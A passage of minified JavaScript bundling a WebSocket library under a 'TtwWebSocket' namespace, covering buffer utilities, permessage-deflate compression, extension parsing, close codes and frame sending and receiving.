buf.fill(fill);}else buf.fill(0);return buf;};global.Lib.Ttw.CLASS.TtwWebSocket.SafeBuffer.allocUnsafe=function(size){ if(typeof size !=="number") throw new TypeError("Argument must be a number"); return global.Buffer.from(size);};global.Lib.Ttw.CLASS.TtwWebSocket.SafeBuffer.allocUnsafeSlow=function(size){ if(typeof size !=="number") throw new TypeError("Argument must be a number"); return buffer.SlowBuffer(size);};})();global.Lib.Ttw.CLASS.TtwWebSocket.Ultron=(function(){"use strict";var has=Object.prototype.hasOwnProperty;var id=0;function Ultron(ee){if(!(this instanceof Ultron)) return new Ultron(ee);this.id=id++;this.ee=ee;}Ultron.prototype.on=function on( event, fn, context ){fn.__ultron=this.id;this.ee.on( event, fn, context );return this;};Ultron.prototype.once=function once( event, fn, context ){fn.__ultron=this.id;this.ee.once( event, fn, context );return this;};Ultron.prototype.remove=function remove(){var args=arguments, ee=this.ee, event;if(args.length===1 &&"string"=== typeof args[0] ){args=args[0].split( /[, ]+/ );}else if(!args.length ){if(ee.eventNames ) args=ee.eventNames();else if(ee._events ){args=[];for(event in ee._events ) if(has.call( ee._events, event)) args.push( event );if(Object.getOwnPropertySymbols ) args=args.concat( Object.getOwnPropertySymbols( ee._events));}}for(var i=0; i<args.length; i++ ){var listeners=ee.listeners( args[ i ] );for(var j=0; j<listeners.length; j++ ){event=listeners[ j ];if(event.listener ){if(event.listener.__ultron !== this.id ) continue;delete event.listener.__ultron;}else{if(event.__ultron !== this.id ) continue;delete event.__ultron;}ee.removeListener( args[ i ], event );}}return this;};Ultron.prototype.destroy=function destroy(){if(!this.ee ) return false;this.remove();this.ee=null;return true;};return Ultron;})();(function(){"use strict";const safeBuffer=require("buffer");const Buffer=safeBuffer.Buffer;const concat=(list, totalLength ) => {const target=Buffer.allocUnsafe( totalLength );var offset=0;for(var i=0; i < list.length; i++ ){const buf=list[ i ];buf.copy( target, offset );offset += buf.length;}return target;};try{const bufferUtil=require("bufferutil");global.Lib.Ttw.CLASS.TtwWebSocket.BufferUtil=Object.assign({ concat }, bufferUtil.BufferUtil||bufferUtil );}catch( e ){const mask=( source, mask, output, offset, length ) => { for(var i=0; i < length; i++ ) output[ offset + i ]=source[ i ] ^ mask[ i & 3 ];};const unmask=( buffer, mask ) => {const length=buffer.length;for(var i=0; i < length; i++ ) buffer[ i ] ^= mask[i & 3];};global.Lib.Ttw.CLASS.TtwWebSocket.BufferUtil={ concat, mask, unmask };}})();(function(){"use strict";const safeBuffer=require("buffer");const zlib=require("zlib");const bufferUtil=global.Lib.Ttw.CLASS.TtwWebSocket.BufferUtil;const Buffer=safeBuffer.Buffer;const AVAILABLE_WINDOW_BITS=[ 8, 9, 10, 11, 12, 13, 14, 15 ];const TRAILER=Buffer.from([ 0x00, 0x00, 0xff, 0xff ]);const EMPTY_BLOCK=Buffer.from([ 0x00 ]);const DEFAULT_WINDOW_BITS=15;const DEFAULT_MEM_LEVEL=8;class PerMessageDeflate {constructor( options, isServer, maxPayload ){this._maxPayload=maxPayload | 0;this._options=options||{};this._threshold=this._options.threshold !== undefined ? this._options.threshold : 1024;this._isServer=!!isServer;this._deflate=null;this._inflate=null;this.params=null;}static get extensionName(){return "permessage-deflate";}offer(){const params={};if(this._options.serverNoContextTakeover ) params.server_no_context_takeover=true;if(this._options.clientNoContextTakeover ) params.client_no_context_takeover=true;if(this._options.serverMaxWindowBits ) params.server_max_window_bits=this._options.serverMaxWindowBits;if(this._options.clientMaxWindowBits ) params.client_max_window_bits=this._options.clientMaxWindowBits;else if(this._options.clientMaxWindowBits==null ) params.client_max_window_bits=true;return params;}accept( paramsList ){paramsList=this.normalizeParams( paramsList );var params;if(this._isServer ) params=this.acceptAsServer( paramsList );else params=this.acceptAsClient( paramsList );this.params=params;return params;}cleanup(){if(this._inflate ){if(this._inflate.writeInProgress ) this._inflate.pendingClose=true;else{this._inflate.close();this._inflate=null;}}if(this._deflate ){if(this._deflate.writeInProgress ) this._deflate.pendingClose=true;else{this._deflate.close();this._deflate=null;}}}acceptAsServer( paramsList ){const accepted={};const result=paramsList.some((params ) => {if(( this._options.serverNoContextTakeover===false && params.server_no_context_takeover )|| ( this._options.serverMaxWindowBits===false && params.server_max_window_bits )|| ( typeof this._options.serverMaxWindowBits==="number"&& typeof params.server_max_window_bits==="number"&& this._options.serverMaxWindowBits > params.server_max_window_bits )|| ( typeof this._options.clientMaxWindowBits==="number"&& !params.client_max_window_bits)){return;}if(this._options.serverNoContextTakeover||params.server_no_context_takeover ) accepted.server_no_context_takeover=true;if(this._options.clientNoContextTakeover ) accepted.client_no_context_takeover=true;if(this._options.clientNoContextTakeover !== false && params.client_no_context_takeover ) accepted.client_no_context_takeover=true;if(typeof this._options.serverMaxWindowBits==="number") accepted.server_max_window_bits=this._options.serverMaxWindowBits;else if(typeof params.server_max_window_bits==="number") accepted.server_max_window_bits=params.server_max_window_bits;if(typeof this._options.clientMaxWindowBits==="number") accepted.client_max_window_bits=this._options.clientMaxWindowBits;else if(this._options.clientMaxWindowBits !== false && typeof params.client_max_window_bits==="number") accepted.client_max_window_bits=params.client_max_window_bits;return true;});if(!result ) throw new Error( `Doesn't support the offered configuration` );return accepted;}acceptAsClient( paramsList ){const params=paramsList[0];if(this._options.clientNoContextTakeover != null )if(this._options.clientNoContextTakeover===false && params.client_no_context_takeover )throw new Error( 'Invalid value for "client_no_context_takeover"' );if(this._options.clientMaxWindowBits != null ){if(this._options.clientMaxWindowBits===false && params.client_max_window_bits )throw new Error( 'Invalid value for "client_max_window_bits"' );if(typeof this._options.clientMaxWindowBits==="number"&& ( !params.client_max_window_bits||params.client_max_window_bits > this._options.clientMaxWindowBits))throw new Error( 'Invalid value for "client_max_window_bits"' );}return params;}normalizeParams( paramsList ){return paramsList.map((params ) => {Object.keys( params ).forEach((key ) => {var value=params[key];if(value.length > 1 ) throw new Error( `Multiple extension parameters for ${key}` );value=value[0];switch( key ){case "server_no_context_takeover" :case "client_no_context_takeover" :if(value !== true ) throw new Error(`invalid extension parameter value for ${key} (${value})` );params[key]=true;break;case "server_max_window_bits" :case "client_max_window_bits" :if(typeof value==="string"){	value=parseInt( value, 10 );	if(!~AVAILABLE_WINDOW_BITS.indexOf( value)) throw new Error( `invalid extension parameter value for ${key} (${value})` );}if(!this._isServer && value===true ) throw new Error( `Missing extension parameter value for ${key}` );params[key]=value;break;default : throw new Error( `Not defined extension parameter (${key})` );}});return params;});}decompress( data, fin, callback ){const endpoint=this._isServer ? "client" : "server";if(!this._inflate ){const maxWindowBits=this.params[ `${endpoint}_max_window_bits` ];this._inflate=zlib.createInflateRaw({ windowBits: typeof maxWindowBits==="number"? maxWindowBits : DEFAULT_WINDOW_BITS });}this._inflate.writeInProgress=true;var totalLength=0;const buffers=[];var err;const onData=(data) => {totalLength += data.length;if(this._maxPayload < 1||totalLength <= this._maxPayload ) return buffers.push(data);err=new Error("max payload size exceeded");err.closeCode=1009;this._inflate.reset();};const onError=(err) => { cleanup(); callback(err);};const cleanup=() => {if(!this._inflate) return;this._inflate.removeListener("error", onError );this._inflate.removeListener("data", onData );this._inflate.writeInProgress=false;if(( fin && this.params[`${endpoint}_no_context_takeover`] )||this._inflate.pendingClose ){this._inflate.close();this._inflate=null;}};this._inflate.on("error", onError ).on("data", onData );this._inflate.write(data);if(fin ) this._inflate.write( TRAILER );this._inflate.flush(() => {cleanup();if(err) callback(err);else callback( null, bufferUtil.concat( buffers, totalLength));});}compress( data, fin, callback ){if(!data||data.length===0 ){process.nextTick( callback, null, EMPTY_BLOCK );return;}const endpoint=this._isServer ? "server" : "client";if(!this._deflate ){const maxWindowBits=this.params[`${endpoint}_max_window_bits`];this._deflate=zlib.createDeflateRaw({flush : zlib.Z_SYNC_FLUSH, windowBits : typeof maxWindowBits==="number"? maxWindowBits : DEFAULT_WINDOW_BITS, memLevel : this._options.memLevel||DEFAULT_MEM_LEVEL});}this._deflate.writeInProgress=true;var totalLength=0;const buffers=[];const onData=(data) => { totalLength += data.length; buffers.push(data);};const onError=(err) => { cleanup(); callback(err);};const cleanup=() => {if(!this._deflate) return;this._deflate.removeListener("error", onError );this._deflate.removeListener("data", onData );this._deflate.writeInProgress=false;if(( fin && this.params[`${endpoint}_no_context_takeover`] )||this._deflate.pendingClose ){this._deflate.close();this._deflate=null;}};this._deflate.on("error", onError ).on("data", onData );this._deflate.write(data);this._deflate.flush( zlib.Z_SYNC_FLUSH, () => {cleanup();var data=bufferUtil.concat( buffers, totalLength );if(fin ) data=data.slice( 0, data.length - 4 );callback( null, data );});}}global.Lib.Ttw.CLASS.TtwWebSocket.PerMessageDeflate=PerMessageDeflate;})();(function(){"use strict";class Event {constructor( type, target ){ this.target=target; this.type=type;}}class MessageEvent extends Event {constructor( data, target ){ super("message", target ); this.data=data;}}class CloseEvent extends Event {constructor( code, reason, target ){super("close", target );this.wasClean=code===undefined||code===1000;this.reason=reason;this.target=target;this.type="close";this.code=code;}}class OpenEvent extends Event {constructor( target ){ super("open", target );}}const EventTarget={addEventListener( method, listener ){if(typeof listener !== "function") return;function onMessage(data){ listener.call( this, new MessageEvent( data, this));}function onClose( code, message ){ listener.call( this, new CloseEvent( code, message, this));}function onError( event ){event.type="error";event.target=this;listener.call( this, event );}function onOpen(){ listener.call( this, new OpenEvent( this));}if(method==="message"){onMessage._listener=listener;this.on( method, onMessage );}else if(method==="close" ){onClose._listener=listener;this.on( method, onClose );}else if(method==="error"){onError._listener=listener;this.on( method, onError );}else if(method==="open"){onOpen._listener=listener;this.on( method, onOpen );}else this.on( method, listener );}, removeEventListener( method, listener ){const listeners=this.listeners( method );for(var i=0; i<listeners.length; i++ )if(listeners[ i ]===listener||listeners[ i ]._listener===listener ) this.removeListener(method, listeners[ i ] );}};global.Lib.Ttw.CLASS.TtwWebSocket.EventTarget=EventTarget;})();(function(){"use strict";const parse=(value) => {value=value||"";const extensions={};value.split(",").forEach((v) => {const params=v.split(";");const token=params.shift().trim();const paramsList=extensions[ token ]=extensions[ token ]||[];const parsedParams={};params.forEach((param ) => {const parts=param.trim().split("=");const key=parts[0];var value=parts[1];if(value===undefined ) value=true;else{if(value[0]==='"' ) value=value.slice( 1 );if(value[ value.length - 1 ]==='"' ) value=value.slice( 0, value.length - 1 );}( parsedParams[key]=parsedParams[key]||[] ).push(value);});paramsList.push( parsedParams );});return extensions;};const format=(value) => {return Object.keys(value).map((token ) => {var paramsList=value[ token ];if(!Array.isArray(paramsList)) paramsList=[ paramsList ];return paramsList.map((params ) => {return [ token ].concat(Object.keys( params ).map( (k) => {var p=params[ k ];if(!Array.isArray( p)) p=[ p ];return p.map((v) => v===true ? k : `${k}=${v}` ).join("; ");})).join("; ");}).join(", ");}).join(", ");};global.Lib.Ttw.CLASS.TtwWebSocket.Extensions={ format, parse };})();(function(){"use strict";const safeBuffer=require("buffer");const Buffer=safeBuffer.Buffer;global.Lib.Ttw.CLASS.TtwWebSocket.Constants={};global.Lib.Ttw.CLASS.TtwWebSocket.Constants.BINARY_TYPES=[ "nodebuffer", "arraybuffer", "fragments" ];global.Lib.Ttw.CLASS.TtwWebSocket.Constants.GUID="258EAFA5-E914-47DA-95CA-C5AB0DC85B11";global.Lib.Ttw.CLASS.TtwWebSocket.Constants.EMPTY_BUFFER=Buffer.alloc(0);global.Lib.Ttw.CLASS.TtwWebSocket.Constants.NOOP=() => {};})();(function(){"use strict";try{const isValidUTF8=require("utf-8-validate");global.Lib.Ttw.CLASS.TtwWebSocket.Validation=typeof isValidUTF8==="object"? isValidUTF8.Validation.isValidUTF8: isValidUTF8;}catch( e ){global.Lib.Ttw.CLASS.TtwWebSocket.Validation=() => true;}})();(function(){"use strict";global.Lib.Ttw.CLASS.TtwWebSocket.ErrorCodes={isValidErrorCode : function( code ){return ( code >= 1000 && code <= 1013 && code !== 1004 && code !== 1005 && code !== 1006 )|| ( code >= 3000 && code <= 4999 );}, 1000 : "normal", 1001 : "going away", 1002 : "protocol error", 1003 : "unsupported data", 1004 : "reserved", 1005 : "reserved for extensions", 1006 : "reserved for extensions", 1007 : "inconsistent or invalid data", 1008 : "policy violation", 1009 : "message too big", 1010 : "extension handshake missing", 1011 : "an unexpected condition prevented the request from being fulfilled", 1012 : "service restart", 1013 : "try again later"};})();(function(){"use strict";const safeBuffer=require("buffer");const PerMessageDeflate=global.Lib.Ttw.CLASS.TtwWebSocket.PerMessageDeflate;const isValidUTF8=global.Lib.Ttw.CLASS.TtwWebSocket.Validation;const bufferUtil=global.Lib.Ttw.CLASS.TtwWebSocket.BufferUtil;const ErrorCodes=global.Lib.Ttw.CLASS.TtwWebSocket.ErrorCodes;const constants=global.Lib.Ttw.CLASS.TtwWebSocket.Constants;const Buffer=safeBuffer.Buffer;const GET_INFO=0;const GET_PAYLOAD_LENGTH_16=1;const GET_PAYLOAD_LENGTH_64=2;const GET_MASK=3;const GET_DATA=4;const INFLATING=5;class Receiver {constructor( extensions, maxPayload, binaryType ){this._binaryType=binaryType||constants.BINARY_TYPES[0];this._extensions=extensions||{};this._maxPayload=maxPayload | 0;this._bufferedBytes=0;this._buffers=[];this._compressed=false;this._payloadLength=0;this._fragmented=0;this._masked=false;this._fin=false;this._mask=null;this._opcode=0;this._totalPayloadLength=0;this._messageLength=0;this._fragments=[];this._cleanupCallback=null;this._hadError=false;this._dead=false;this._loop=false;this.onmessage=null;this.onclose=null;this.onerror=null;this.onping=null;this.onpong=null;this._state=GET_INFO;}readBuffer( bytes ){var offset=0;var dst;var l;this._bufferedBytes -= bytes;if(bytes===this._buffers[0].length ) return this._buffers.shift();if(bytes < this._buffers[0].length ){dst=this._buffers[0].slice(0, bytes);this._buffers[0]=this._buffers[0].slice( bytes );return dst;}dst=Buffer.allocUnsafe( bytes );while( bytes > 0 ){l=this._buffers[0].length;if(bytes >= l ){this._buffers[0].copy( dst, offset );offset += l;this._buffers.shift();}else{this._buffers[0].copy( dst, offset, 0, bytes );this._buffers[0]=this._buffers[0].slice( bytes );}bytes -= l;}return dst;}hasBufferedBytes( n ){if(this._bufferedBytes >= n ) return true;this._loop=false;if(this._dead ) this.cleanup( this._cleanupCallback );return false;}add(data){if(this._dead ) return;this._bufferedBytes += data.length;this._buffers.push(data);this.startLoop();}startLoop(){this._loop=true;while( this._loop ){switch( this._state ){case GET_INFO : this.getInfo(); break;case GET_PAYLOAD_LENGTH_16 : this.getPayloadLength16(); break;case GET_PAYLOAD_LENGTH_64 : this.getPayloadLength64(); break;case GET_MASK : this.getMask(); break;case GET_DATA : this.getData(); break;default : this._loop=false;}}}getInfo(){if(!this.hasBufferedBytes(2)) return;const buf=this.readBuffer(2);if(( buf[0] & 0x30 ) !== 0x00 ){this.error( new Error("RSV2 and RSV3 must be clear"), 1002 );return;}const compressed=( buf[0] & 0x40 )===0x40;if(compressed && !this._extensions[ PerMessageDeflate.extensionName ] ){ this.error( new Error("RSV1 must be clear"), 1002 ); return;}this._fin=( buf[0] & 0x80 )===0x80;this._opcode=buf[0] & 0x0f;this._payloadLength=buf[1] & 0x7f;if(this._opcode===0x00 ){if(compressed ){ this.error( new Error("RSV1 must be clear"), 1002 ); return;}if(!this._fragmented ){ this.error( new Error( `invalid opcode: ${this._opcode}` ), 1002 ); return;}else this._opcode=this._fragmented;}else if(this._opcode===0x01||this._opcode===0x02 ){if(this._fragmented ){ this.error( new Error( `invalid opcode: ${this._opcode}` ), 1002 ); return;}this._compressed=compressed;}else if(this._opcode > 0x07 && this._opcode < 0x0b ){if(!this._fin ){ this.error( new Error("FIN must be set"), 1002 ); return;}if(compressed ){ this.error( new Error("RSV1 must be clear"), 1002 ); return;}if(this._payloadLength > 0x7d ){ this.error( new Error("invalid payload length"), 1002 ); return;}}else{ this.error( new Error( `invalid opcode: ${this._opcode}`), 1002 ); return;}if(!this._fin && !this._fragmented) this._fragmented=this._opcode;this._masked=( buf[1] & 0x80)===0x80;if(this._payloadLength===126 ) this._state=GET_PAYLOAD_LENGTH_16;else if(this._payloadLength===127 ) this._state=GET_PAYLOAD_LENGTH_64;else this.haveLength();}getPayloadLength16(){if(!this.hasBufferedBytes(2)) return;this._payloadLength=this.readBuffer(2).readUInt16BE( 0, true );this.haveLength();}getPayloadLength64(){if(!this.hasBufferedBytes( 8)) return;const buf=this.readBuffer( 8 );const num=buf.readUInt32BE( 0, true );if(num > Math.pow(2, 53 - 32) - 1 ){ this.error( new Error("max payload size exceeded"), 1009 ); return;}this._payloadLength=( num * Math.pow( 2, 32)) + buf.readUInt32BE( 4, true );this.haveLength();}haveLength(){if(this._opcode < 0x08 && this.maxPayloadExceeded( this._payloadLength)) return;if(this._masked ) this._state=GET_MASK;else this._state=GET_DATA;}getMask(){if(!this.hasBufferedBytes( 4)) return;this._mask=this.readBuffer( 4 );this._state=GET_DATA;}getData(){var data=constants.EMPTY_BUFFER;if(this._payloadLength ){if(!this.hasBufferedBytes( this._payloadLength)) return;data=this.readBuffer( this._payloadLength );if(this._masked ) bufferUtil.unmask( data, this._mask );}if(this._opcode > 0x07 ) this.controlMessage(data);else if(this._compressed ){this._state=INFLATING;this.decompress(data);}else if(this.pushFragment( data)) this.dataMessage();}decompress(data ){const perMessageDeflate=this._extensions[ PerMessageDeflate.extensionName ];perMessageDeflate.decompress( data, this._fin, ( err, buf ) => {if(err ){ this.error( err, err.closeCode===1009 ? 1009 : 1007); return;}if(this.pushFragment( buf)) this.dataMessage();this.startLoop();});}dataMessage(){if(this._fin ){const messageLength=this._messageLength;const fragments=this._fragments;this._totalPayloadLength=0;this._messageLength=0;this._fragmented=0;this._fragments=[];if(this._opcode===2 ){var data;if(this._binaryType==="nodebuffer") data=toBuffer( fragments, messageLength );else if(this._binaryType==="arraybuffer") data=toArrayBuffer( toBuffer( fragments, messageLength));else data=fragments;this.onmessage(data);}else{const buf=toBuffer( fragments, messageLength );if(!isValidUTF8( buf)){ this.error( new Error("invalid utf8 sequence"), 1007); return;}this.onmessage( buf.toString() );}}this._state=GET_INFO;}controlMessage(data){if(this._opcode===0x08 ){if(data.length===0 ){this.onclose( 1000, "");this._loop=false;this.cleanup( this._cleanupCallback );}else if(data.length===1 ) this.error( new Error("invalid payload length"), 1002 );else{const code=data.readUInt16BE( 0, true );if(!ErrorCodes.isValidErrorCode( code)){ this.error( new Error( `invalid status code: ${code}`), 1002 ); return;}const buf=data.slice(2);if(!isValidUTF8( buf)){ this.error( new Error("invalid utf8 sequence"), 1007); return;}this.onclose( code, buf.toString() );this._loop=false;this.cleanup( this._cleanupCallback );}return;}if(this._opcode===0x09 ) this.onping(data);else this.onpong(data);this._state=GET_INFO;}error( err, code ){this.onerror( err, code );this._hadError=true;this._loop=false;this.cleanup( this._cleanupCallback );}maxPayloadExceeded( length ){if(length===0||this._maxPayload < 1 ) return false;const fullLength=this._totalPayloadLength + length;if(fullLength <= this._maxPayload ){ this._totalPayloadLength=fullLength; return false;}this.error( new Error("max payload size exceeded"), 1009);return true;}pushFragment( fragment ){if(fragment.length===0 ) return true;const totalLength=this._messageLength + fragment.length;if(this._maxPayload < 1||totalLength <= this._maxPayload ){this._messageLength=totalLength;this._fragments.push( fragment );return true;}this.error( new Error("max payload size exceeded"), 1009 );return false;}cleanup(cb){this._dead=true;if(!this._hadError && ( this._loop||this._state===INFLATING)) this._cleanupCallback=cb;else{this._extensions=null;this._fragments=null;this._buffers=null;this._mask=null;this._cleanupCallback=null;this.onmessage=null;this.onclose=null;this.onerror=null;this.onping=null;this.onpong=null;if(cb)cb();}}}global.Lib.Ttw.CLASS.TtwWebSocket.Receiver=Receiver;function toBuffer( fragments, messageLength ){if(fragments.length===1 ) return fragments[0];if(fragments.length > 1 ) return bufferUtil.concat( fragments, messageLength );return constants.EMPTY_BUFFER;}function toArrayBuffer(buf){if(buf.byteOffset===0 && buf.byteLength===buf.buffer.byteLength ) return buf.buffer;return buf.buffer.slice( buf.byteOffset, buf.byteOffset + buf.byteLength );}})();(function(){"use strict";const safeBuffer=require("buffer");const crypto=require("crypto");const PerMessageDeflate=global.Lib.Ttw.CLASS.TtwWebSocket.PerMessageDeflate;const bufferUtil=global.Lib.Ttw.CLASS.TtwWebSocket.BufferUtil;const ErrorCodes=global.Lib.Ttw.CLASS.TtwWebSocket.ErrorCodes;const Buffer=safeBuffer.Buffer;class Sender {constructor( socket, extensions ){this._extensions=extensions||{};this._socket=socket;this._firstFragment=true;this._compress=false;this._bufferedBytes=0;this._deflating=false;this._queue=[];this.onerror=null;}static frame( data, options ){const merge=data.length < 1024||( options.mask && options.readOnly );var offset=options.mask ? 6 : 2;var payloadLength=data.length;if(data.length >= 65536 ){ offset += 8; payloadLength=127;}else if(data.length > 125 ){ offset += 2; payloadLength=126;}const target=Buffer.allocUnsafe( merge ? data.length + offset : offset );target[0]=options.fin ? options.opcode | 0x80 : options.opcode;if(options.rsv1) target[0] |= 0x40;if(payloadLength===126 ) target.writeUInt16BE( data.length, 2, true );else if(payloadLength===127 ){target.writeUInt32BE( 0, 2, true );target.writeUInt32BE( data.length, 6, true );}if(!options.mask ){target[1]=payloadLength;if(merge ){data.copy( target, offset );return [ target ];}return [ target, data ];}const mask=crypto.randomBytes( 4 );target[1]=payloadLength | 0x80;target[ offset - 4 ]=mask[0];target[ offset - 3 ]=mask[1];target[ offset - 2 ]=mask[2];target[ offset - 1 ]=mask[ 3 ];if(merge ){bufferUtil.mask( data, mask, target, offset, data.length );return [ target ];}bufferUtil.mask( data, mask, data, 0, data.length );return [ target, data ];}close( code, data, mask,cb){if(code !== undefined && (typeof code !=="number"|| !ErrorCodes.isValidErrorCode( code)) )throw new Error("first argument must be a valid error code number");const buf=Buffer.allocUnsafe(2 + (data ? Buffer.byteLength(data) : 0));buf.writeUInt16BE( code||1000, 0, true );if(buf.length > 2 ) buf.write( data, 2 );if(this._deflating ) this.enqueue([ this.doClose, buf, mask,cb]);else this.doClose( buf, mask,cb);}doClose( data, mask,cb){ this.sendFrame( Sender.frame( data, { fin : true, rsv1 : false, opcode : 0x08, mask, readOnly : false }),cb);}ping (data, mask ){var readOnly=true;if(!Buffer.isBuffer( data)){if(data instanceof ArrayBuffer ) data=Buffer.from(data);else if(ArrayBuffer.isView( data)) data=viewToBuffer(data);else{data=Buffer.from(data);readOnly=false;}}if(this._deflating ) this.enqueue([ this.doPing, data, mask, readOnly ]);else this.doPing( data, mask, readOnly );}doPing( data, mask, readOnly ){ this.sendFrame( Sender.frame( data, { fin : true, rsv1 : false, opcode : 0x09, mask, readOnly }));}pong( data, mask ){var readOnly=true;if(!Buffer.isBuffer( data)){if(data instanceof ArrayBuffer ) data=Buffer.from(data);else if(ArrayBuffer.isView( data)) data=viewToBuffer(data);else{data=Buffer.from(data);readOnly=false;}}if(this._deflating ) this.enqueue([ this.doPong, data, mask, readOnly ]);else this.doPong( data, mask, readOnly );}doPong( data, mask, readOnly ){ this.sendFrame( Sender.frame( data, { fin : true, rsv1 : false, opcode : 0x0a, mask, readOnly }));}send( data, options,cb){var opcode=options.binary ? 2 : 1;var rsv1=options.compress;var readOnly=true;if(!Buffer.isBuffer( data)){if(data instanceof ArrayBuffer ) data=Buffer.from(data);else if(ArrayBuffer.isView( data)) data=viewToBuffer(data);else{data=Buffer.from(data);readOnly=false;}}const perMessageDeflate=this._extensions[PerMessageDeflate.extensionName];if(this._firstFragment ){this._firstFragment=false;if(rsv1 && perMessageDeflate ) rsv1=data.length >= perMessageDeflate._threshold;this._compress=rsv1;}else{rsv1=false;opcode=0;}if(options.fin ) this._firstFragment=true;if(perMessageDeflate ){const opts={ fin : options.fin, rsv1, opcode, mask : options.mask, readOnly };if(this._deflating ) this.enqueue([ this.dispatch, data, this._compress, opts,cb]);else this.dispatch( data, this._compress, opts,cb);}else this.sendFrame( Sender.frame( data, { fin : options.fin, rsv1 : false, opcode, mask : options.mask, readOnly }),cb);}dispatch( data, compress, options,cb){if(!compress ){ this.sendFrame( Sender.frame( data, options ),cb); return;}const perMessageDeflate=this._extensions[ PerMessageDeflate.extensionName ];this._deflating=true;perMessageDeflate.compress( data, options.fin, ( err, buf ) => {if(err ){if(cb)cb(err);else this.onerror(err);return;}options.readOnly=false;this.sendFrame( Sender.frame( buf, options ),cb);this._deflating=false;this.dequeue();});}dequeue (){while( !this._deflating && this._queue.length ){const params=this._queue.shift();this._bufferedBytes -= params[1].length;params[0].apply(this, params.slice( 1));}}enqueue( params ){ this._bufferedBytes += params[1].length; this._queue.push( params );}sendFrame(list,cb){if(list.length===2 ){this._socket.write(list[0] );this._socket.write(list[1],cb);}else this._socket.write(list[0],cb);}}global.Lib.Ttw.CLASS.TtwWebSocket.Sender=Sender;function viewToBuffer( view ){const buf=Buffer.from( view.buffer );if(view.byteLength !== view.buffer.byteLength ) return buf.slice( view.byteOffset, view.byteOffset + view.byteLength );return buf;}})();(function(){"use strict";const EventEmitter=require("events");const crypto=require("crypto");const Ultron=global.Lib.Ttw.CLASS.TtwWebSocket.Ultron;const https=require("https");const http=require("http");const url=require("url");const PerMessageDeflate=global.Lib.Ttw.CLASS.TtwWebSocket.PerMessageDeflate;const EventTarget=global.Lib.Ttw.CLASS.TtwWebSocket.EventTarget;const Extensions=global.Lib.Ttw.CLASS.TtwWebSocket.Extensions;const constants=global.Lib.Ttw.CLASS.TtwWebSocket.Constants;const Receiver=global.Lib.Ttw.CLASS.TtwWebSocket.Receiver;const Sender=global.Lib.Ttw.CLASS.TtwWebSocket.Sender;const protocolVersions=[ 8, 13 ];const closeTimeout=30 * 1000;class WebSocket extends EventEmitter {constructor( address, protocols, options ){super();if(!protocols ) protocols=[];else if(typeof protocols==="string") protocols=[ protocols ];else if(!Array.isArray( protocols)){options=protocols;protocols=[];}this.readyState=WebSocket.CONNECTING;this.bytesReceived=0;this.extensions={};this.protocol="";this._binaryType=constants.BINARY_TYPES[0];this._finalize=this.finalize.bind( this );this._finalizeCalled=false;this._closeMessage=null;this._closeTimer=null;this._closeCode=null;this._receiver=null;this._sender=null;this._socket=null;this._ultron=null;if(Array.isArray( address)) initAsServerClient.call(this, address[0], address[1], options );else initAsClient.call( this, address, protocols, options );}get CONNECTING(){return WebSocket.CONNECTING;}get CLOSING(){return WebSocket.CLOSING;}get CLOSED(){return WebSocket.CLOSED;}get OPEN(){return WebSocket.OPEN;}get bufferedAmount(){var amount=0;if(this._socket ) amount=this._socket.bufferSize + this._sender._bufferedBytes;return amount;}get binaryType(){return this._binaryType;}set binaryType(type){if(constants.BINARY_TYPES.indexOf(type) < 0 ) return;this._binaryType=type;if(this._receiver) this._receiver._binaryType=type;}setSocket( socket, head ){socket.setTimeout(0);socket.setNoDelay();this._receiver=new Receiver( this.extensions, this._maxPayload, this.binaryType );this._sender=new Sender( socket, this.extensions );this._ultron=new Ultron( socket );this._socket=socket;this._ultron.on("close", this._finalize );this._ultron.on("error", this._finalize );this._ultron.on("end", this._finalize );if(head && head.length > 0 ){ socket.unshift( head ); head=null;}this._ultron.on("data",(data) => { this.bytesReceived += data.length; this._receiver.add(data);});this._receiver.onmessage=(data) => this.emit("message", data );this._receiver.onping=(data) => { this.pong( data, !this._isServer, true ); this.emit("ping", data );};this._receiver.onpong=(data) => this.emit("pong", data );this._receiver.onclose =( code, reason) => {this._closeMessage=reason;this._closeCode=code;this.close( code, reason );};this._receiver.onerror=( error, code) => {this.close( code, "");this.emit("error", error );};this._sender.onerror =( error) => { this.close( 1002, ""); this.emit("error", error );};this.readyState=WebSocket.OPEN;this.emit("open");}finalize( error ){if(this._finalizeCalled ) return;this.readyState=WebSocket.CLOSING;this._finalizeCalled=true;clearTimeout( this._closeTimer );this._closeTimer=null;if(error) this._closeCode=1006;if(this._socket ){this._ultron.destroy();this._socket.on("error", function onerror(){ this.destroy();});if(!error) this._socket.end();else this._socket.destroy();this._socket=null;this._ultron=null;}if(this._sender ) this._sender=this._sender.onerror=null;if(this._receiver ){this._receiver.cleanup(() => this.emitClose());this._receiver=null;}else this.emitClose();}emitClose(){this.readyState=WebSocket.CLOSED;this.emit("close", this._closeCode||1006, this._closeMessage||"");if(this.extensions[ PerMessageDeflate.extensionName ] ) this.extensions[ PerMessageDeflate.extensionName ].cleanup();this.extensions=null;this.removeAllListeners();this.on("error", constants.NOOP );}pause(){ if(this.readyState !== WebSocket.OPEN) throw new Error("not opened"); this._socket.pause();}resume(){ if(this.readyState !== WebSocket.OPEN) throw new Error("not opened"); this._socket.resume();}close( code, data ){if(this.readyState===WebSocket.CLOSED) return;if(this.readyState===WebSocket.CONNECTING ){if(this._req && !this._req.aborted ){this._req.abort();this.emit("error", new Error("closed before the connection is established") );this.finalize(true);}return;}if(this.readyState===WebSocket.CLOSING ){ if(this._closeCode && this._socket ) this._socket.end(); return;}this.readyState=WebSocket.CLOSING;this._sender.close(code, data, !this._isServer,(err) => {if(err ) this.emit("error", err );if(this._socket ){if(this._closeCode) this._socket.end();clearTimeout( this._closeTimer );this._closeTimer=setTimeout( this._finalize, closeTimeout, true );}});}ping( data, mask, failSilently ){if(this.readyState !== WebSocket.OPEN ){ if(failSilently ) return; throw new Error("not opened");}if(typeof data==="number") data=data.toString();if(mask===undefined) mask=!this._isServer;this._sender.ping( data||constants.EMPTY_BUFFER, mask );}pong( data, mask, failSilently ){if(this.readyState !== WebSocket.OPEN ){ if(failSilently ) return; throw new Error("not opened");}if(typeof data==="number") data=data.toString();if(mask===undefined ) mask=!this._isServer;this._sender.pong( data||constants.EMPTY_BUFFER, mask );}send( data, options,cb){if(typeof options==="function"){cb=options; options={};}if(this.readyState !== WebSocket.OPEN ){if(cb)cb( new Error("not opened") );else throw new Error("not opened");return;}if(typeof data==="number") data=data.toString();const opts=Object.assign({ binary : typeof data !== "string", mask : !this._isServer, compress : true, fin : true }, options );if(!this.extensions[ PerMessageDeflate.extensionName ] ) opts.compress=false;this._sender.send( 